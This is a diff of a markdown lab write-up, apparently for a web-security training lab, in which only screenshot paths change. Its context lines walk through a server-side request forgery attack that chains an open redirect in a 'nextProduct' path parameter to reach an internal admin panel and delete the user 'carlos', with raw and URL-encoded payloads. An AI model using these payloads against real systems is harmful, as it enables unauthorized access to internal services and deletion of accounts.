@@ -26,19 +26,19 @@ but no admin panel display
 there is next product in stock check feature page click and intercept
 GET /product/nextProduct?currentProductId=2&path=/product?productId=3
 
-![screenshot](./images/lab4_next_product.png)
+![screenshot](images/lab4_next_product.jpg)
 
 click on _follow redirection_
 
-![screenshot](./images/lab4_follow_redirection.png)
+![screenshot](images/lab4_follow_redirection.jpg)
 
 enter https://www.google.com in path senction
 
-![screenshot](./images/lab4_test_ssrf_vulnerability.png)
+![screenshot](images/lab4_test_ssrf_vulnerability.jpg)
 
 click on folllow redirection
 
-![screenshot](./images/lab4_render_follow_redirection.png)
+![screenshot](images/lab4_render_follow_redirection.jpg)
 
 ### step3
 
@@ -52,7 +52,7 @@ stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/a
 url encoded
 stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin
 
-![screenshot](./images/lab4_admin_panel_carlos_wiener.png)
+![screenshot](images/lab4_admin_panel_carlos_wiener.jpg)
 
 add /http://192.168.0.12:8080/admin/delete?username=carlos
 
@@ -60,4 +60,4 @@ stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/a
 url encoded
 stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete%3fusername%3dcarlos
 
-![screenshot](./images/lab4_carlos_deleted.png)
+![screenshot](images/lab4_carlos_deleted.jpg)
